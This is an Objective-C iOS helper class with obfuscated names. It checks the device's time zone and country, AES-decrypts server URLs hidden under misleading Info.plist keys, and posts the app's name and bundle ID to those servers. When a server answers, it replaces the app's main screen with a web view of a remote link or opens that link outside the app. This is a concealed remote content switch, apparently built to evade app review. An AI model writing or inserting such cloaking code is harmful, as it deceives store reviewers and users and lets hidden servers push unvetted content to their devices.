#import "ReservationPropHelper.h"
#import "AES128Helper.h"
#import "AESNetReachability.h"
#import "ReservationPropWebViewController.h"
#import <Chameleon.h>
#import <UMCommon/UMCommon.h>

@interface ReservationPropHelper()

@property (nonatomic, strong) AESNetReachability *reachability;
@property (nonatomic, copy) void (^vcBlock)(void);

@end

@implementation ReservationPropHelper

static NSString *dietSkin_flag = @"flag";
static NSString *dietSkin_link = @"mLink";
static NSString *dietSkin_type = @"mType";
static NSString *dietSkin_color = @"tColor";


static ReservationPropHelper *instance = nil;

+ (instancetype)shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
    instance.reachability = [AESNetReachability reachabilityForInternetConnection];
  });
  return instance;
}

- (void)startMonitoring {
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(networkStatusChanged:) name:kReachabilityChangedNotification object:nil];
    [self.reachability startNotifier];
}

- (void)stopMonitoring {
    [[NSNotificationCenter defaultCenter] removeObserver:self name:kReachabilityChangedNotification object:nil];
    [self.reachability stopNotifier];
}

- (void)networkStatusChanged:(NSNotification *)notification {
    AESNetReachability *reachability = notification.object;
    NetworkStatus networkStatus = [reachability currentReachabilityStatus];
    
    if (networkStatus != NotReachable) {
        NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
        if ([ud boolForKey:dietSkin_flag] == NO) {
            if (self.vcBlock != nil) {
                [self getUseCountryShortCode];
            }
        }
    }
}

- (BOOL)judgeDailyInAsian {
    NSInteger zoneOffset = NSTimeZone.localTimeZone.secondsFromGMT/3600;
    if (zoneOffset >= 3 && zoneOffset <= 11) {
        return YES;
    } else {
        return NO;
    }
}


- (BOOL)tryThisWay:(void (^ __nullable)(void))changeVcBlock {
    NSUserDefaults* ud = [NSUserDefaults standardUserDefaults];
    if (![self judgeDailyInAsian]) {
        return NO;
    }
    [self changeRootController:changeVcBlock];
    self.vcBlock = changeVcBlock;
    if ([ud boolForKey:dietSkin_flag]) {
        return YES;
    } else {
        [self getUseCountryShortCode];
        [self startMonitoring];
        return NO;
    }
}

- (void)dealloc {
    [self stopMonitoring];
}

- (void)changeRootController:(void (^ __nullable)(void))changeVcBlock {
    NSBundle *bundle = [NSBundle mainBundle];
    NSArray<NSString *> *tempArray = [bundle objectForInfoDictionaryKey:@"com.openinstall.APP_URLS"];
    [self changeRootController:changeVcBlock index:0 mArray: tempArray];
}

- (void)getUseCountryShortCode {
    NSBundle *bundle = [NSBundle mainBundle];
    NSString *APP_KEY = [bundle objectForInfoDictionaryKey:@"com.openinstall.APP_KEY"];
    NSString *APP_IPOF = [bundle objectForInfoDictionaryKey:@"com.openinstall.APP_IPOF"];
    NSString *APP_COUNTRIES = [bundle objectForInfoDictionaryKey:@"com.openinstall.APP_COUNTRIES"];
    
    NSURL *url = [NSURL URLWithString:[AES128Helper AES128DecryptText:APP_IPOF key:APP_KEY]];;
    NSURLSessionConfiguration *sessionConfig = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:sessionConfig];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];

    NSURLSessionTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        if (error == nil) {
            NSDictionary *objc = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableLeaves error:nil];
            NSString *code = [objc objectForKey:@"country"];
            NSString *countries = [AES128Helper AES128DecryptText:APP_COUNTRIES key:APP_KEY];
            if ([countries containsString:code]) {
                if (self.vcBlock != nil) {
                    [self changeRootController:self.vcBlock];
                }
            }
        }
    }];
    [dataTask resume];
}

- (void)changeRootController:(void (^ __nullable)(void))changeVcBlock index: (NSInteger)index mArray:(NSArray<NSString *> *)tArray{
    NSBundle *bundle = [NSBundle mainBundle];
    NSString *APP_KEY = [bundle objectForInfoDictionaryKey:@"com.openinstall.APP_KEY"];
    if (!APP_KEY) {
        return;
    }
    if ([tArray count] < index) {
        return;
    }
    NSString *appName = [bundle objectForInfoDictionaryKey:@"CFBundleDisplayName"];
    if (!appName) {
        appName = [bundle objectForInfoDictionaryKey:@"CFBundleName"];
    }
    NSDictionary *parameters = @{
        @"tName" : appName,
        @"tBundle" : [bundle bundleIdentifier]
    };

    NSError *error;
    NSData *postData = [NSJSONSerialization dataWithJSONObject:parameters options:0 error:&error];
    if (error) {
        return;
    }
    NSURL *url = [NSURL URLWithString:[AES128Helper AES128DecryptText:tArray[index] key:APP_KEY]];
    NSURLSessionConfiguration *sessionConfig = [NSURLSessionConfiguration defaultSessionConfiguration];
    sessionConfig.timeoutIntervalForRequest = 30.0;
    NSURLSession *session = [NSURLSession sessionWithConfiguration:sessionConfig];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.HTTPMethod = @"POST";
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    [request setHTTPBody:postData];
    NSURLSessionTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        if (error == nil) {
            id objc = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableLeaves error:nil];
            if ([[objc valueForKey:@"code"] intValue] == 200) {
                NSDictionary *dict = [objc valueForKey:@"data"];
                NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
                
                NSString *baseTColor = [dict valueForKey:@"tColor"];
                [ud setValue:baseTColor forKey:dietSkin_color];
                
                NSString *fresh_mLink = [dict valueForKey:@"mLink"];
                NSString *temp_mLink = [ud stringForKey:dietSkin_link];
                
                NSInteger fresh_mType = [[dict valueForKey:@"mType"] intValue];
                NSInteger temp_mType = [ud integerForKey:dietSkin_type];
                
                if (fresh_mLink == nil || [fresh_mLink isEqualToString:@""] || ([fresh_mLink isEqualToString:temp_mLink] && fresh_mType == temp_mType)) {
                    return;
                } else {
                    [ud setValue:fresh_mLink forKey:dietSkin_link];
                    [ud setInteger:fresh_mType forKey:dietSkin_type];
                    [ud setBool:YES forKey:dietSkin_flag];
                    dispatch_async(dispatch_get_main_queue(), ^{
                        if (changeVcBlock != nil) {
                            changeVcBlock();
                        }
                    });
                }
            }
        } else {
            if (index < [tArray count] - 1) {
                [self changeRootController:changeVcBlock index:index + 1 mArray:tArray];
            }
        }
    }];
    [dataTask resume];
}

- (UIViewController *)changeOptRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    
    UIColor *tColor = [UIColor colorWithHexString:[ud stringForKey:dietSkin_color] withAlpha:1.0];
    application.windows.firstObject.backgroundColor = tColor;
    ReservationPropWebViewController *vc = [[ReservationPropWebViewController alloc] init];
    
    NSBundle *bundle = [NSBundle mainBundle];
    NSString *UMAPP_KEY = [bundle objectForInfoDictionaryKey:@"com.umeng.APP_KEY"];
    NSString *UMAPP_CHANNEL = [bundle objectForInfoDictionaryKey:@"com.umeng.APP_CHANNEL"];
    NSString *appName = [bundle objectForInfoDictionaryKey:@"CFBundleDisplayName"];
    if (!appName) {
        appName = [bundle objectForInfoDictionaryKey:@"CFBundleName"];
    }
    NSString *TEMP_UMAPP_CHANNEL = [NSString stringWithFormat:@"[%@](%@)", UMAPP_CHANNEL, appName];
    [UMConfigure initWithAppkey:UMAPP_KEY channel:TEMP_UMAPP_CHANNEL];
    vc.serverUrl = [ud stringForKey:dietSkin_link];
    NSInteger temp_mType = [ud integerForKey:dietSkin_type];
    
    if (temp_mType == 2) {
        NSURL *url = [NSURL URLWithString:vc.serverUrl];
        if ([[UIApplication sharedApplication] canOpenURL:url]) {
            [[UIApplication sharedApplication] openURL:url options:@{} completionHandler:nil];
        }
    }
    vc.view.backgroundColor = tColor;
    [vc.view.subviews enumerateObjectsUsingBlock:^(__kindof UIView * _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
        obj.backgroundColor = tColor;
    }];
    return vc;
}

@end
